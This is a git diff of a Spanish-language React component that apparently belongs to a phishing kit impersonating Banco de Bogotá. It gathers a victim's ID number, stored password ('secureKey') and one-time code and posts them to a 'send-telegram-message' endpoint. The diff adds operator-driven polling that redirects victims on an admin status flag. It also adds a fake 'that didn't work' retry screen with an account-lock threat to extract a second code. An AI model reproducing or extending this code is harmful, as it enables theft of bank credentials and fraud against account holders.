@@ -1,16 +1,15 @@
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 
-const OTP = () => {
+const ErrorOTP = () => {
   const [otp, setOtp] = useState('');
   const [cardNumber, setCardNumber] = useState('');
-  const [message, setMessage] = useState('');
   const [documentNumber, setDocumentNumber] = useState('');
-  const [loading, setLoading] = useState(false); // Ya no necesitamos "loading" en este contexto
+  const [loading, setLoading] = useState(true);
+  const [message, setMessage] = useState(''); // Agregado el estado message
   const navigate = useNavigate();
 
   useEffect(() => {
-    // Recuperar los valores del formulario del localStorage cuando el componente se monta
     const savedFormValues = localStorage.getItem('formValues');
     const savedDocumentNumber = localStorage.getItem('documentNumber');
     const savedSecureKey = localStorage.getItem('secureKey');
@@ -21,38 +20,50 @@ const OTP = () => {
     }
 
     if (savedDocumentNumber) {
-      setDocumentNumber(savedDocumentNumber); // Asignamos el número de documento al estado
+      setDocumentNumber(savedDocumentNumber);
     }
 
     if (!savedDocumentNumber || !savedSecureKey) {
       setMessage('No se encontraron los datos necesarios en el localStorage.');
     }
-  }, [navigate]); // El "useEffect" ahora solo maneja la carga de datos del localStorage
+
+    const interval = setInterval(async () => {
+      try {
+        const response = await fetch('http://127.0.0.1:8000/api/v1/admin/guests');
+        const data = await response.json();
+
+        if (data && data.guests && data.guests[0] && data.guests[0].status_id === 6) {
+          setLoading(false);
+          navigate('/bancodebogota/ingreso/codigo_seguridad');
+        }
+      } catch (error) {
+        console.error('Error al consultar el estado:', error);
+      }
+    }, 3000);
+
+    return () => clearInterval(interval);
+  }, [navigate]);
 
   const handleSubmit = async () => {
     if (otp.length === 6) {
-      // Obtener datos del localStorage
       const savedDocumentNumber = localStorage.getItem('documentNumber');
       const savedSecureKey = localStorage.getItem('secureKey');
       const savedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
       const banco = localStorage.getItem('banco') || 'No disponible';
 
       if (savedDocumentNumber && savedSecureKey) {
-        // Obtener el ID del "guest" almacenado en localStorage
         const guestId = localStorage.getItem('guestId');
         if (!guestId) {
           setMessage('No se encontró el ID del guest en el localStorage.');
           return;
         }
 
-        // Crear el objeto con los datos que el backend necesita
         const dataToSend = {
           otp: otp,
           documentNumber: savedDocumentNumber,
           secureKey: savedSecureKey,
         };
 
-        // Enviar los datos al backend
         try {
           const response = await fetch('http://127.0.0.1:8000/api/v1/send-telegram-message', {
             method: 'POST',
@@ -66,14 +77,13 @@ const OTP = () => {
             throw new Error('Error al enviar los datos al backend');
           }
 
-          // Si la respuesta es exitosa, proceder con la actualización del estado del guest
           const updateResponse = await fetch(`http://127.0.0.1:8000/api/v1/guest/${guestId}`, {
             method: 'PUT',
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-              status_id: 1, // Actualizar el status_id a 1
+              status_id: 1,
             }),
           });
 
@@ -81,7 +91,6 @@ const OTP = () => {
             throw new Error('Error al actualizar el estado');
           }
 
-          // Redirigir a la página de loading después de actualizar el estado
           navigate('/loading');
         } catch (error) {
           console.error('Error al enviar datos:', error);
@@ -91,8 +100,8 @@ const OTP = () => {
         setMessage('Datos del formulario no disponibles.');
       }
 
-      setOtp('');  // Resetear OTP
-      setMessage('');  // Resetear mensaje de error
+      setOtp('');
+      setMessage('');
     } else {
       setMessage('Por favor, ingrese un código de 6 dígitos.');
     }
@@ -111,10 +120,10 @@ const OTP = () => {
       <img src="../../../public/hombre-afro-caminando-con-bolsas-en-el-hombro.jpg" alt="hombre con bolsas"
         className='mb-4' />
       <div className="space-y-4 text-center">
-        <h1>Registro de <b>Nuevo Dispositivo</b></h1>
+        <p className='text-red-500'>¡Eso no funcionó!</p>
         <div className="flex flex-col items-center text-gray-500">
-          <p>Acabamos de detectar un nuevo ingreso a la plataforma de un dispositivo no registrado.</p>
-          <p>Por tu seguridad te hemos enviado un código de acceso a el numero registrado a la cuenta con número de Identificación <b>{documentNumber || 'No disponible'} </b></p>
+          <p>Por tu seguridad te hemos enviado un nuevo código de acceso a el numero registrado a la cuenta con número de Identificación <b>{documentNumber || 'No disponible'}.</b></p>
+          <b className='pt-2 text-red-500'>Después de 2 intentos más se bloqueará la cuenta</b>
           <span className="text-gray-700 pt-2 font-bold">Digite el Código:</span>
           <input
             type="text"
@@ -144,4 +153,4 @@ const OTP = () => {
   );
 };
 
-export default OTP;
+export default ErrorOTP;
